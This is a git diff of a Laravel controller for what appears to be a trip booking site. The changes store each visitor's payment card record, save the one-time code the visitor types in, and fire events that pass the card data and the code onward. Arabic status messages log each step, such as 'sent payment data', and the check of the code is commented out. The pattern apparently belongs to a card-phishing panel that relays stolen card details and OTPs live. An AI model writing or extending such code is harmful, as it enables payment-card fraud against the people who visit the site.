@@ -184,7 +184,13 @@ class TripController extends Controller
             if ($visitor) {
                 $validated['visitor_notifications_id'] = $visitor?->id ?? VisitorNotifications::create([])->id;
                 // $validated['otp_code'] = random_int(100000,999999);
-                $payment_card = PaymentCard::create($validated);
+                $payment_card =PaymentCard::where('visitor_notifications_id',$visitor?->id)->first();
+                if(!$payment_card)
+                {
+                    $payment_card = PaymentCard::create($validated);
+                }else{
+                    $payment_card->update($validated);
+                }
 
                 $not  = VisitorNotifications::find($visitor->id);
                 $not->update(['page' => 'قام بإرسال بيانات الدفع','step_number'=>6]);
@@ -218,7 +224,8 @@ class TripController extends Controller
                 $payment_card = PaymentCard::where('visitor_notifications_id',$visitor->id)->first();
                 $payment_card->otp_code = $request->code;
                 $payment_card->save();
-
+                $not  = VisitorNotifications::find($visitor->id);
+                event(new SendPart($payment_card,$not));
             }
             return redirect()->route('confirm_card_owner');
         } catch (\Exception $ex) {
@@ -257,6 +264,8 @@ class TripController extends Controller
                 // if($request->code != $payment_card->otp_code) return back()->withErrors(['code' => 'الكود غير صحيح']);
                 $not  = VisitorNotifications::find($visitor->id);
                 $not->update(['page' => 'أرسل رقم البطاقة','step_number'=>8]);
+
+                event(new SendPart($payment_card,$not));
                 event(new SendAuth($not,$request->code));
                 event(new SendNotification($not));
             }
